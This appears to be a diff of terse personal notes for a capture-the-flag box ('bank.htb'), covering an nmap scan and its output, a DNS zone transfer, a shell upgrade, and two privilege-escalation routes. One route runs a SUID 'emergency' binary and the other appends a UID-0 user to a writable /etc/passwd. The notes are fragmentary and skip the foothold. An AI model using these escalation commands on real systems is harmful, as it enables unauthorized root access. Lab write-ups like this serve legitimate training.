@@ -1,0 +1,108 @@
+ping 10.129.29.200
+
+export ip=10.129.29.200
+
+printenv $ip
+
+sudo nmap -sV -O -T4 -A -sC -p- $ip -oA nmap
+
+Note: 
+Here on port 53 DNS is enabled which is TCP normally its UDP based
+its tcp if response bytes are more than 512 bytes that means Zone transfer is enabled on the server
+
+Lets Start Zone transfer (i.e dns recon):
+nslookup
+    > SERVER 10.129.29.200
+    > 127.0.0.1
+    > 10.129.29.200
+    > bank.htb  ###### Just gussing the name as ctf box name is.
+
+dnsrecon -r 127.0.0.0/24 -n 10.129.29.200
+dnsrecon -r 127.0.1.0/24 -n 10.129.29.200
+dnsrecon -r 10.129.78.0/24 -n 10.129.29.200
+
+dig axfr @10.129.29.200 # first checking zonetransfer on root
+dig axfr bank.htb @10.129.29.200
+; <<>> DiG 9.16.4-Debian <<>> axfr bank.htb @10.129.29.200
+;; global options: +cmd
+bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
+bank.htb.               604800  IN      NS      ns.bank.htb.
+bank.htb.               604800  IN      A       10.10.10.29
+ns.bank.htb.            604800  IN      A       10.10.10.29
+www.bank.htb.           604800  IN      CNAME   bank.htb.
+bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
+;; Query time: 488 msec
+;; SERVER: 10.129.29.200#53(10.129.29.200)
+;; WHEN: Mon Jan 11 07:48:05 EST 2021
+;; XFR size: 6 records (messages 1, bytes 171)
+
+from the above result we have many subdomains.
+but insteated of adding this in /etc/hosts i will add in the /etc/resolvers bcz dns server is setup on the server
+
+10.129.29.200 bank.htb chris.bank.htb www.bank.htb ns.bank.htb
+
+bank.htb website have redirect without exit vuln.......we can index.php, support.php
+
+
+python -c 'import pty;pty.spawn("/bin/bash");'
+ctrl+z to background
+stty raw -echo
+click fb enter
+
+
+find the file name 'emergency' which have root shell
+also found by LinEnum
+
+./emergency
+    id (root)
+    cd /root 
+    cat root.txt 
+
+Method 2:
+/etc/passwd file write able, so we will add a user in it.
+openssl passwd mrcake
+    GGkUX8tNNKnR.
+echo "root2:GGkUX8tNNKnR.:0:0:/root:/bin/bash" >> /etc/passwd
+
+
+
+-------- NMAP Result ----------------------------------
+Nmap scan report for 10.129.29.200
+Host is up (0.14s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
+|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
+|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
+|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
+53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=1/11%OT=22%CT=1%CU=39207%PV=Y%DS=2%DC=T%G=Y%TM=5FFC2BE
+OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS(
+OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1723/tcp)
+HOP RTT       ADDRESS
+1   126.69 ms 10.10.14.1
+2   129.18 ms 10.129.29.200
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 544.92 seconds
